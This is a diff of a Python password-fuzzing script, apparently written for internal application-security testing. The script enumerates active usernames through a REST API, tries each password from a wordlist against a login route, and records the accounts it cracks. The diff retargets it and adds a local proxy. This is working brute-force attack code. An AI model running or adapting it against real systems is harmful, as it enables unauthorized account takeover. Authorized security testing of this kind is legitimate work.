@@ -5,15 +5,16 @@ import requests
 from v1_password_fuzzer import construct_unames, construct_passwords
 
 def record_credentials(creds):
-    file = open("blackbox_cracked_accounts.txt", "a")
+    file = open("cracked_accounts.txt", "a")
     file.writelines(creds + "\n")
     file.close()
 
-default_url = "http://gjohnson3/pwd/"
+default_url = "http://gjohnson3/bcrypt/"
+default_proxy = "http://localhost:8080/"
 login_route = "Account.mvc/Login/"
-member_api_url = "http://gjohnson3/pwd/rest-1.v1/Data/Member?sel=Username&where=IsLoginDisabled='False'"
+member_api_url = default_url + "rest-1.v1/Data/Member?sel=Username&where=IsLoginDisabled='False'"
 
-unames = construct_unames(member_api_url)
+unames = construct_unames(member_api_url, default_proxy)
 print("constructed {0} usernames...".format(len(unames)))
 
 passwords = construct_passwords()
@@ -39,7 +40,8 @@ for uname in unames:
     for pw in passwords:
         r = session.post(default_url + login_route, \
             data = {'username': uname, 'password': pw, 'Destination': ''}, \
-            headers = {'user-agent': 'V1AppSec-PasswordFuzzer'})
+            headers = {'user-agent': 'V1AppSec-PasswordFuzzer'}, \
+            proxies = default_proxy)
         cnt = cnt + 1
         update = "working...{0} of {1} requests made\r".format(cnt, total_requests)
         print(update, end="", flush=True)
